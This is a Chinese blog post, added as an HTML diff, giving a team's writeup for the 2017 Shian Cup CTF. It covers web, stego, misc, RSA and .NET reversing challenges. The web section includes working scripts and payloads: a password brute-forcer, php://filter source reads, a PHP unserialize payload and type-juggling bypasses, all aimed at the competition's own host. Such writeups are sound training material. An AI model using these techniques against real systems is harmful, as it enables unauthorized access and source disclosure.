@@ -1,0 +1,177 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>2017世安杯writeup详解 | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">2017世安杯writeup详解</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2017/10/21/shianctf/">2017-10-21</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF竞赛训练/">CTF竞赛训练</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>国庆打了场CTF，在此分享出我们队的Writeup(很多表哥队都AK了，然而我们不会逆向~~)，Writeup中的所有python程序基于python3，文章末尾附上题目链接，大家有兴趣可以自行练习。<a id="more"></a></p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ctf入门级题目"><a href="#ctf入门级题目" class="headerlink" title="ctf入门级题目"></a>ctf入门级题目</h4><p>题目<br><img src="/img/shianctf/image1.png" alt><br>主要考察ereg()函数漏洞，ereg读到%00的时候就截止了，根据代码意思构造payload，%00左边为数字，右边为–即可绕过。<br><img src="/img/shianctf/image2.png" alt><br>具体可以参考下文：<br><a href="http://blog.csdn.net/lanvnal/article/details/54634589" target="_blank" rel="noopener">http://blog.csdn.net/lanvnal/article/details/54634589</a></p>
+<h4 id="曲奇饼"><a href="#曲奇饼" class="headerlink" title="曲奇饼"></a>曲奇饼</h4><p>题目<br><img src="/img/shianctf/image3.png" alt><br>Burpsuite抓包可见端倪<br><img src="/img/shianctf/image4.png" alt><br>尝试读取index.php的源代码：</p>
+<pre><code>import requests
+url = &quot;http://ctf1.shiyanbar.com/shian-quqi/index.php?line=%s&amp;file=aW5kZXgucGhw&quot;
+for i in range(100):
+   r = requests.get(url%i)
+   if r.text:
+      print(r.text)
+</code></pre><p>运行上面的python代码，可以获取index.php的源代码，如下：<br><img src="/img/shianctf/image5.png" alt><br>根据php代码可知，需要设置指定cookie为li_lr_480，访问thisis_flag.php方可获取flag，构造payload如下<br><img src="/img/shianctf/image6.png" alt><br>intval()函数执行成功时返回 变量的10进制值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。</p>
+<h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>题目代码太长了，这里分成以下3段来分析<br>x1部分代码<br><img src="/img/shianctf/image7.png" alt><br>x1=0或者0dffd或1dfdf或者其他非数字开头的字符串<br>X2部分代码<br><img src="/img/shianctf/image8.png" alt><br>本地构造payload<br><img src="/img/shianctf/image9.png" alt><br>x2={“x21”:”2018sasa”,”x22”:[[0],0]}<br>x3部分代码<br><img src="/img/shianctf/image10.png" alt><br>在php中，0eXXX….(XXX为数字)表示科学记数法,PHP会对其取0值，看如下代码即可明白<br><img src="/img/shianctf/image11.png" alt><br>所以我们只要找出符合条件的数值作为x3的值即可，python程序如下</p>
+<pre><code>import re
+import hashlib
+md = hashlib.md5(&quot;15562&quot;.encode())
+s = md.hexdigest()[8:8+16]
+print(&apos;md5(15562) =&apos;,s)
+for i in range(10000000):
+   md = hashlib.md5((&apos;XIPU&apos;+str(i)).encode())
+   x = md.hexdigest()[8:8+16]
+   if re.findall(&apos;^0e\d*$&apos;,x):
+      print(&apos;XIPU&apos;+str(i))
+      print(x)
+</code></pre><p><img src="/img/shianctf/image12.png" alt><br>最后结合起来，payload如下：<br><a href="http://ctf1.shiyanbar.com/shian-leixing/?x1=1dfdf&amp;x2={&quot;x21&quot;:&quot;2018sasa&quot;,&quot;x22&quot;:[[0],0]}&amp;x3=XIPU18570" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/shian-leixing/?x1=1dfdf&amp;x2={&quot;x21&quot;:&quot;2018sasa&quot;,&quot;x22&quot;:[[0],0]}&amp;x3=XIPU18570</a><br><img src="/img/shianctf/image13.png" alt></p>
+<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><p>题目<br><img src="/img/shianctf/image14.png" alt><br>Burp抓包测试一下，发现返回信息不同<br><img src="/img/shianctf/image15.png" alt><br><img src="/img/shianctf/image16.png" alt><br>据说有提示，放这么下面，让我一顿好找<br><img src="/img/shianctf/image17.png" alt><br>那就是爆破了，写个python脚本自动获取flag</p>
+<pre><code>import requests
+import re
+l = [str(&quot;%05d&quot;%i) for i in range(0,100000)]
+for i in l:
+   sess = requests.Session()
+   print(&quot;Test passwd&quot;,i)
+   url = &quot;http://ctf1.shiyanbar.com/shian-s/index.php?username=admin&amp;password=%s&amp;randcode=%s&quot;
+   r = sess.get(url)
+   code = re.findall(&apos;\d{3}&apos;,r.text)[0]
+   url = url % (i,code)
+   r = sess.get(url)
+   if &quot;flag&quot; in r.text:
+      print(&quot;The password is&quot;,i)
+      # print(r.text)
+      print(re.findall(&apos;flag{[\w\d]+}&apos;,r.text)[0])
+      break
+</code></pre><p><img src="/img/shianctf/image18.png" alt></p>
+<h4 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h4><p>题目源码<br><img src="/img/shianctf/image19.png" alt><br>根据代码提示，我们使用php://input给user变量传值，使用php://filter来读取index.php和class.php的源代码。<br><img src="/img/shianctf/image20.png" alt><br>index.php<br><img src="/img/shianctf/image21.png" alt><br>class.php<br><img src="/img/shianctf/image22.png" alt><br>根据index.php的$pass = unserialize($pass);以及class.php代码，再结合利用php://filter协议，最终构造出我们要传入的pass的值<br><img src="/img/shianctf/image23.png" alt><br>最终的payload如下<br><a href="http://ctf1.shiyanbar.com/shian-du/?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;}" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/shian-du/?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;}</a><br><img src="/img/shianctf/image24.png" alt><br>具体可以参考下文：<br><a href="http://blog.csdn.net/niexinming/article/details/52623790" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/52623790</a></p>
+<h3 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h3><h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><p>题目是一张bmp图片，根据提示low可以是LSB隐写，python解题代码如下</p>
+<pre><code>import PIL.Image as Image
+img = Image.open(&apos;low.bmp&apos;)
+img_tmp = img.copy()
+pix = img_tmp.load()
+width,height = img_tmp.size
+for w in range(width):
+   for h in range(height):
+      if pix[w,h]&amp;1 == 0:
+         pix[w,h] = 0
+      else:
+         pix[w,h] = 255
+img_tmp.show()
+</code></pre><p><img src="/img/shianctf/image25.png" alt></p>
+<h4 id="斑马斑马"><a href="#斑马斑马" class="headerlink" title="斑马斑马"></a>斑马斑马</h4><p>使用在线条形码扫描即可<br><a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">https://online-barcode-reader.inliteresearch.com/</a><br><img src="/img/shianctf/image26.png" alt></p>
+<h4 id="CreateByWho"><a href="#CreateByWho" class="headerlink" title="CreateByWho"></a>CreateByWho</h4><p>题目就是这样<br>会ps的用ps，不会的可以打印出来，剪刀剪完再贴起来<br><img src="/img/shianctf/image27.png" alt><br>最后拼出来是这样<br><img src="/img/shianctf/image28.png" alt></p>
+<h4 id="适合作为桌面的图片"><a href="#适合作为桌面的图片" class="headerlink" title="适合作为桌面的图片"></a>适合作为桌面的图片</h4><p>将图片导入stegsolve中可调出一个二维码<br><img src="/img/shianctf/image29.png" alt><br><img src="/img/shianctf/image30.png" alt><br>将该16进制串写入文件并保存成.pyc结尾文件，然后反编译出python源代码，运行即可<br><img src="/img/shianctf/image31.png" alt></p>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Reverseme"><a href="#Reverseme" class="headerlink" title="Reverseme"></a>Reverseme</h4><p>用winhex打开，发现里面的字符反过来可以正常阅读，所以文件被倒置了<br><img src="/img/shianctf/image32.png" alt><br>Python解题程序如下</p>
+<pre><code>with open(&apos;reverseMe&apos;,&apos;rb&apos;) as f:
+   with open(&apos;flag&apos;,&apos;wb&apos;) as g:
+      g.write(f.read()[::-1])
+</code></pre><p>将获取的flag打开，倒过来即可<br><img src="/img/shianctf/image33.png" alt><br><img src="/img/shianctf/image34.png" alt></p>
+<h5 id="珍妮的qq号"><a href="#珍妮的qq号" class="headerlink" title="珍妮的qq号"></a>珍妮的qq号</h5><p>珍妮换了一个新的QQ号码，原来的号码和新的号码都是5位靓号哦；其次，新的号码是原来号码的4倍，并且原来的号码倒着写正好是新的号码，请问，新号码是多少，新号码即为key。</p>
+<pre><code>for old in range(10000,30000):
+   new = old*4
+   rever = list(str(old))
+   rever.reverse()
+   if &apos;&apos;.join(rever) == str(new):
+      print(new)
+      break
+</code></pre><p>key{87912}</p>
+<h4 id="心仪的公司"><a href="#心仪的公司" class="headerlink" title="心仪的公司"></a>心仪的公司</h4><p>方法一：<br>这题是一道流量分析题，用wireshark打开，题目提示是：对网站上传webshell获取了公司的图片。所以我们直接http筛选，有两个内网地址192.168.1.111和192.168.1.108，查看192.168.1.111的包发现XFF字段并且大量访问外网。猜测是192.168.1.108做反向代理攻击：参考<a href="http://www.cnblogs.com/wenthink/p/HTTTP_Proxy_TCP_Http_Headers_Check.html" target="_blank" rel="noopener">http://www.cnblogs.com/wenthink/p/HTTTP_Proxy_TCP_Http_Headers_Check.html</a><br><img src="/img/shianctf/image35.png" alt><br>筛选192.168.1.108的数据包发现：<br><img src="/img/shianctf/image36.png" alt><br>TCP流追踪：<br><img src="/img/shianctf/image37.png" alt><br>flag到手。（其实之前是以为要做图片修复还原然后间接获得flag，感受到出题者的真诚。）<br>方法二：<br>strings webshell.pcapng | grep “^f”<br><img src="/img/shianctf/image38.png" alt></p>
+<h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>涉及到逆向工程，不会。。。</p>
+<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>题目<br>c = 2044619806634581710230401748541393297937319<br>n = 92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143<br>下面是python2代码，因为libnum模块只能在python2.7环境下运行</p>
+<pre><code>c= 2044619806634581710230401748541393297937319 
+n= 92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143
+import libnum
+for e in range(2,10):
+    m = libnum.nroot(c,e)
+    if m**e==c:
+        break
+print &quot;e:&quot;,e
+print &quot;m:&quot;,m
+flag = libnum.n2s(m)
+print &apos;flag:&apos;,flag
+</code></pre><p><img src="/img/shianctf/image39.png" alt><br>libnum模块安装<br>git clone <a href="https://github.com/hellman/libnum" target="_blank" rel="noopener">https://github.com/hellman/libnum</a><br>cd libnum<br>python setup.py install</p>
+<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h4><p>提示是微软的一门语言，用PEiD分析是.net<br><img src="/img/shianctf/image40.png" alt><br>用dnSpy打开，在@02000003翻到关键代码块，稍微整理后主要部分如下：</p>
+<pre><code>using System;  
+using System.Security.Cryptography;  
+using System.Text;  
+
+internal class Console{  
+    private static string one(string A_0){  
+        byte[] bytes = Encoding.ASCII.GetBytes(A_0);  
+        return &quot;flag{&quot; + BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(bytes)).Replace(&quot;-&quot;, &quot;&quot;) + &quot;}&quot;;  
+    }  
+
+    private static void Main(string[] A_0){  
+        string b = null;  
+        string value = string.Format(&quot;{0}&quot;, DateTime.Now.Hour + 1);  
+        string a_ = &quot;CreateByTenshine&quot;;  
+        four(a_, Convert.ToInt32(value), ref b);
+         Console.WriteLine(b);  //直接打印b得到flag
+        string a = Console.ReadLine();        
+        if (a == b){  
+            Console.WriteLine(&quot;u got it!&quot;);  
+            Console.ReadKey(true);  
+        }  
+        else{  
+            Console.Write(&quot;wrong&quot;);  
+        }  
+        Console.ReadKey(true);      
+    }  
+
+    private static int three(int A_0, int A_1){  
+        return (new int[]{  
+            2,3,5,7,11,13,17,19,23,29,31,  
+            37,41,43,47,53,59,61,67,71,73,  
+            79,83,89,97,101,103,107,109,113  
+        })[A_1] ^ A_0;  
+    }  
+
+    private static void four(string A_0, int A_1, ref string A_2){  
+        int num = 0;  
+        if (0 &lt; A_0.Length){  
+            do{  
+                char c = A_0[num];  
+                int num2 = 1;  
+                do{  
+                    c = Convert.ToChar(three(Convert.ToInt32(c), num2));  
+                    num2++;  
+                }  
+                while (num2 &lt; 15);  
+                A_2 += c;  
+                num++;  
+            }  
+            while (num &lt; A_0.Length);  
+        }  
+        A_2 = one(A_2); 
+    }
+}
+</code></pre><p>看了一下代码的大致流程：在Main函数里b被赋值，值是one函数里返回的flag字符串，其中包含一个将byte变量加密后的字符串，而byte变量接收的参数来自第52行的four函数………整个函数的b是自动生成的，中间有一个value变量随时间改变，但没有使用到，所以b是一个常量，可以直接在第15行b被赋值之后添加一行代码打印出b就能得到flag。<br>直接拖到<a href="https://ideone.com/#在线运行" target="_blank" rel="noopener">https://ideone.com/#在线运行</a><br><img src="/img/shianctf/image41.png" alt><br>将flag作为输入也提示正确<br><img src="/img/shianctf/image42.png" alt></p>
+<h4 id="android"><a href="#android" class="headerlink" title="android"></a>android</h4><p>题解：<a href="http://www.voidcn.com/article/p-uwalkxon-bmt.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-uwalkxon-bmt.html</a></p>
+<h4 id="动态暴力破解"><a href="#动态暴力破解" class="headerlink" title="动态暴力破解"></a>动态暴力破解</h4><p>拖入ida查看string处<br>FYM-OI}olte_zi_wdqedd_djrzuj_shgmEDFqo{处理后即可得到flag<br><a href="https://advancedpersistentjest.com/2016/03/28/writeup-sleeper_cell/" target="_blank" rel="noopener">https://advancedpersistentjest.com/2016/03/28/writeup-sleeper_cell/</a><br><a href="https://github.com/xil-se/xil.se/blob/master/content/post/pwn2win-2016-sleeper-cell-kbeckmann.md" target="_blank" rel="noopener">https://github.com/xil-se/xil.se/blob/master/content/post/pwn2win-2016-sleeper-cell-kbeckmann.md</a><br>剩下这3道逆向都不会：getflag、bin、简单算法</p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>所有题目地址<br><img src="/img/shianctf/image43.png" alt></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2017/10/21/shianctf/">https://mochazz.github.io/2017/10/21/shianctf/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/CTF/">CTF</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2017/11/04/sqli-labs7-10/">&lt; sqli-labs7-10</a><a class="next" href="/2017/10/10/rsa/">RSA学习 &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
+.v a { color: #0F9FB4; }
+.v a:hover { color: #216C73; }
+.v li { list-style: inherit; }
+.v .vwrap { border: 1px solid #223441; border-radius: 0; }
+.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.v .vbtn { border-radius: 0; color: #cecece; background: none; }
+.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
+.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
+.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
